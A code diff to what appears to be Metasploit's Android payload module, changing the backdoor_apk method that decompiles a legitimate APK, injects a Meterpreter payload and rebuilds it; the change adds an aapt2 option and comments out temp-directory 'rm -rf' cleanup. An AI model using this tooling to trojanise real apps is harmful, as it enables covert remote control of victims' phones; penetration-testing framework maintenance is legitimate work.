@@ -141,7 +141,7 @@ class Msf::Payload::Apk
     return orig_cert_data
   end
 
-  def backdoor_apk(apkfile, raw_payload)
+  def backdoor_apk(apkfile, raw_payload, use_aapt2)
     unless apkfile && File.readable?(apkfile)
       usage
       raise RuntimeError, "Invalid template: #{apkfile}"
@@ -189,10 +189,15 @@ class Msf::Payload::Apk
     #-alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \
     #-keysize 2048 -startdate '#{orig_cert_startdate}' \
     #-validity #{orig_cert_validity} -dname '#{orig_cert_dname}'")
-    run_cmd("rm -rf #{tempdir}/*")
+    #run_cmd("rm -rf #{tempdir}/*")
 
     File.open("#{tempdir}/payload.apk", "wb") {|file| file.puts raw_payload }
     FileUtils.cp apkfile, "#{tempdir}/original.apk"
+    if use_aapt2
+      aapt = "-a /usr/bin/aapt2"
+    else
+      aapt = "-a /usr/bin/aapt"
+    end
 
     print_status "Decompiling original APK..\n"
     run_cmd("apktool d #{tempdir}/original.apk -o #{tempdir}/original")
@@ -266,7 +271,7 @@ class Msf::Payload::Apk
     fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
 
     print_status "Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}\n"
-    apktool_output = run_cmd("apktool b -a /usr/bin/aapt -o #{tempdir}/output.apk #{tempdir}/original")
+    apktool_output = run_cmd("apktool b #{aapt} -o #{tempdir}/output.apk #{tempdir}/original")
     unless File.readable?(injected_apk)
       print_error apktool_output
       raise RuntimeError, "Unable to rebuild apk with apktool"
@@ -277,7 +282,7 @@ class Msf::Payload::Apk
     #run_cmd("zipalign 4 #{injected_apk} #{aligned_apk}")
 
     outputapk = File.read(signed_apk)
-    run_cmd("rm -rf #{tempdir}/*")
+    #run_cmd("rm -rf #{tempdir}/*")
 
     #FileUtils.remove_entry tempdir
     outputapk
